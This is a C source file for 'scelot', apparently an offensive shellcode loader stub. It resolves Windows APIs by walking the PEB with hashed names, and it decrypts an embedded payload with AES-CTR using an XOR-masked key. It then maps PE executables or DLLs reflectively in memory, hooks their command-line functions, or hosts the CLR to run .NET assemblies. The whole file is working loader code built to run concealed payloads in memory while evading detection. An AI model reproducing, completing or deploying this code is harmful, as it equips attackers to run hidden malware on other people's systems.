// Loader stub C-side. Called from prologue_*.asm with self_base in rcx
// (x64) / pushed (x86, cdecl). The asm prologue is responsible for the
// call/pop self-locating trick and the polymorphic NOP region.
#include <windows.h>
#include "peb.h"
#include "hash.h"
#include "instance.h"
#include "map_pe.h"
#include "host_clr.h"
#include "aes.h"

typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef VOID    (WINAPI *fn_ExitProcess)(UINT);
typedef VOID    (WINAPI *fn_ExitThread)(DWORD);
typedef int     (WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCCH, int, LPWSTR, int);
typedef int     (WINAPI *fn_MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);

// Debug trace via MessageBoxA. Disabled by default — define SCELOT_TRACE
// at compile time to re-enable bring-up beacons.
#ifdef SCELOT_TRACE
static void trace(const char* tag) {
    void* k32 = peb_find_module(hash_ansi("KERNEL32.DLL"));
    if (!k32) return;
    fn_LoadLibraryA pLL = (fn_LoadLibraryA)peb_find_proc(k32, hash_ansi("LoadLibraryA"));
    if (!pLL) return;
    HMODULE u32 = pLL("user32.dll");
    if (!u32) return;
    fn_GetProcAddress pGPA = (fn_GetProcAddress)peb_find_proc(k32, hash_ansi("GetProcAddress"));
    if (!pGPA) return;
    fn_MessageBoxA mb = (fn_MessageBoxA)pGPA(u32, "MessageBoxA");
    if (mb) mb(NULL, tag, "scelot trace", 0);
}
#else
static void trace(const char* tag) { (void)tag; }
#endif

typedef struct _API {
    fn_LoadLibraryA        pLoadLibraryA;
    fn_GetProcAddress      pGetProcAddress;
    fn_VirtualAlloc        pVirtualAlloc;
    fn_VirtualProtect      pVirtualProtect;
    fn_ExitProcess         pExitProcess;
    fn_ExitThread          pExitThread;
    fn_RtlAddFunctionTable pRtlAddFunctionTable;
    fn_MultiByteToWideChar pMultiByteToWideChar;
} API;

// Patched in-place by the generator. Kept in this TU so the compiler emits
// plain RIP-relative loads rather than the cross-TU __ImageBase + offset
// pattern that breaks once we extract just .text into the shellcode blob.
// Accessed exclusively through __declspec(noinline) getters that return
// runtime pointers into the volatile arrays — this prevents constant
// folding even with /O2.
static volatile const uint32_t k_stub_size = 0xA5A5A501u;
static volatile const uint8_t  k_inst_key[16] = {
    0xC0,0xDE,0xC0,0xDE,0xC0,0xDE,0xC0,0xDE,
    0xC0,0xDE,0xC0,0xDE,0xC0,0xDE,0xC0,0xDE
};
static volatile const uint8_t  k_inst_iv[16] = {
    0xBA,0xAD,0xF0,0x0D,0xBA,0xAD,0xF0,0x0D,
    0xBA,0xAD,0xF0,0x0D,0xBA,0xAD,0xF0,0x0D
};
static volatile const uint8_t  k_key_mask[16] = {
    0xF0,0x0D,0xBE,0xEF,0xF0,0x0D,0xBE,0xEF,
    0xF0,0x0D,0xBE,0xEF,0xF0,0x0D,0xBE,0xEF
};


// Per-process buffers populated before transferring control to the payload.
// Static lifetime is fine: the IAT-hooked GetCommandLine* return pointers
// directly into these buffers.
static char    g_cmdline_a[1024];
static wchar_t g_cmdline_w[1024];

static LPSTR  WINAPI scelot_GetCommandLineA(void) { return g_cmdline_a; }
static LPWSTR WINAPI scelot_GetCommandLineW(void) { return g_cmdline_w; }

static int resolve_apis(API* a) {
    void* k32 = peb_find_module(hash_ansi("KERNEL32.DLL"));
    void* ntd = peb_find_module(hash_ansi("ntdll.dll"));
    if (!k32 || !ntd) return -1;
    a->pLoadLibraryA   = (fn_LoadLibraryA)  peb_find_proc(k32, hash_ansi("LoadLibraryA"));
    a->pGetProcAddress = (fn_GetProcAddress)peb_find_proc(k32, hash_ansi("GetProcAddress"));
    a->pVirtualAlloc   = (fn_VirtualAlloc)  peb_find_proc(k32, hash_ansi("VirtualAlloc"));
    a->pVirtualProtect = (fn_VirtualProtect)peb_find_proc(k32, hash_ansi("VirtualProtect"));
    a->pExitProcess    = (fn_ExitProcess)   peb_find_proc(k32, hash_ansi("ExitProcess"));
    a->pExitThread     = (fn_ExitThread)    peb_find_proc(k32, hash_ansi("ExitThread"));
    a->pMultiByteToWideChar =
        (fn_MultiByteToWideChar)peb_find_proc(k32, hash_ansi("MultiByteToWideChar"));
    a->pRtlAddFunctionTable =
        (fn_RtlAddFunctionTable)peb_find_proc(ntd, hash_ansi("RtlAddFunctionTable"));
    if (!a->pLoadLibraryA || !a->pGetProcAddress || !a->pVirtualAlloc ||
        !a->pVirtualProtect || !a->pExitProcess || !a->pExitThread ||
        !a->pMultiByteToWideChar) return -2;
    return 0;
}

static void prepare_args(API* api, const char* args) {
    int i = 0;
    for (; i < (int)sizeof(g_cmdline_a) - 1 && args[i]; ++i) g_cmdline_a[i] = args[i];
    g_cmdline_a[i] = 0;
    api->pMultiByteToWideChar(CP_UTF8, 0, g_cmdline_a, -1,
                              g_cmdline_w,
                              sizeof(g_cmdline_w) / sizeof(wchar_t));
}

typedef int  (WINAPI *fn_pe_entry)(void);
typedef BOOL (WINAPI *fn_dll_entry)(HINSTANCE, DWORD, LPVOID);
typedef void (WINAPI *fn_dll_export)(LPSTR);

// extract_text lays out the blob with a fake PE-header-sized prefix of
// zeros so that runtime __ImageBase equals the blob start. We use that
// to locate the Instance regardless of where the linker placed code.
extern char __ImageBase[];

void Start(void* self_base) {
    (void)self_base;
    API api;
    if (resolve_apis(&api) != 0) return;

    uint8_t* base = (uint8_t*)__ImageBase;
    SCELOT_INSTANCE* enc_inst = (SCELOT_INSTANCE*)(base + k_stub_size);

    uint8_t key[16], iv[16];
    for (int i = 0; i < 16; ++i) key[i] = (uint8_t)(k_inst_key[i] ^ k_key_mask[i]);
    for (int i = 0; i < 16; ++i) iv[i]  = k_inst_iv[i];

    AES128_CTX ctx;
    aes128_key_expand(&ctx, key);

    aes128_ctr_xcrypt(&ctx, iv, (uint8_t*)enc_inst, sizeof(SCELOT_INSTANCE));
    SCELOT_INSTANCE inst = *enc_inst;
    if (inst.magic != SCELOT_MAGIC) return;

    uint8_t* payload = (uint8_t*)api.pVirtualAlloc(
        NULL, inst.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!payload) return;
    uint8_t* enc_payload = (uint8_t*)enc_inst + inst.instance_size;
    for (uint32_t i = 0; i < inst.payload_size; ++i) payload[i] = enc_payload[i];
    aes128_ctr_xcrypt(&ctx, inst.payload_iv, payload, inst.payload_size);

    if (inst.args[0]) prepare_args(&api, inst.args);

    MAP_API mapi = {
        api.pLoadLibraryA, api.pGetProcAddress,
        api.pVirtualAlloc, api.pVirtualProtect,
        api.pRtlAddFunctionTable
    };
    void* entry = 0;
    void* image = 0;
    int ec = 0;

    if (inst.payload_type == SCELOT_PAYLOAD_PE_EXE) {
        image = map_pe_full(&mapi, payload, inst.payload_size, &entry);
        if (!image) return;
        if (inst.args[0]) {
            map_pe_hook_cmdline(&mapi, image,
                                (void*)scelot_GetCommandLineA,
                                (void*)scelot_GetCommandLineW);
        }
        ec = ((fn_pe_entry)entry)();
    } else if (inst.payload_type == SCELOT_PAYLOAD_PE_DLL) {
        image = map_pe_full(&mapi, payload, inst.payload_size, &entry);
        if (!image) return;
        if (inst.args[0]) {
            map_pe_hook_cmdline(&mapi, image,
                                (void*)scelot_GetCommandLineA,
                                (void*)scelot_GetCommandLineW);
        }
        ((fn_dll_entry)entry)((HINSTANCE)image, DLL_PROCESS_ATTACH, 0);
        if (inst.export_name[0]) {
            void* ex = map_pe_find_export(image, inst.export_name);
            if (ex) ((fn_dll_export)ex)(inst.args);
        }
    } else if (inst.payload_type == SCELOT_PAYLOAD_NET_EXE ||
               inst.payload_type == SCELOT_PAYLOAD_NET_DLL) {
        host_clr_run(api.pLoadLibraryA, api.pGetProcAddress,
                     payload, inst.payload_size, &inst);
    }

    if (inst.exit_mode == SCELOT_EXIT_PROCESS)      api.pExitProcess((UINT)ec);
    else if (inst.exit_mode == SCELOT_EXIT_THREAD)  api.pExitThread((DWORD)ec);
}
